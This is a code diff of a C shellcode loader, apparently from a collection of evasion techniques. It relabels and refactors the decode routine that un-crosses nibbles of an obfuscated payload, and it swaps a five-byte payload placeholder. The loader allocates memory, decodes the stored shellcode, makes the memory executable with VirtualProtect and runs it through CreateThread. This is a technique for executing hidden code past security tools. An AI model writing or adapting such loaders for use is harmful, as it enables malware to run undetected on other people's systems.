@@ -9,7 +9,7 @@ Compile:
 
 Technique:
     - allocation: VirtualAlloc
-    - writing:    Feistel
+    - writing:    Bit Cross-Over
     - permission: VirtualProtect
     - execution:  CreateThread
 */
@@ -31,6 +31,9 @@ Technique:
 // 8-bit rotation
 #define rotl(x,n)       ((x) << (n) | (x) >> (8 - (n)))
 #define rotr(x,n)       ((x) >> (n) | (x) << (8 - (n)))
+
+#define high(x)         (x & 0xF0)
+#define low(x)          (x & 0x0F)
 
 /*
     dst: buffer which will receive the decoded shellcode
@@ -55,8 +58,8 @@ void transform (uint8_t * dst, uint8_t * src, size_t size)
         R   = rotl(src[idx + 1] ^ key, 3);
 
         // get half of each byte and cross them
-        dst[idx    ] = (L & 0xF0) | (R & 0x0F);
-        dst[idx + 1] = (L & 0x0F) | (R & 0xF0); 
+        dst[idx    ] = (high(L) | low(R));
+        dst[idx + 1] = (high(R) | low(L)); 
     }
 }
 
@@ -68,7 +71,7 @@ int main()
     DWORD   old_protect = 0;
 
     // shellcode storage in stackz
-    uint8_t     payload []  = { 0x35,0x90,0xa5,0xc3,0xf9 };
+    uint8_t     payload []  = { 0x35,0xb1,0x27,0x2b,0xac };
     uint32_t    payload_len = 5;
 
     // allocate memory buffer for payload as READ-WRITE (no executable)
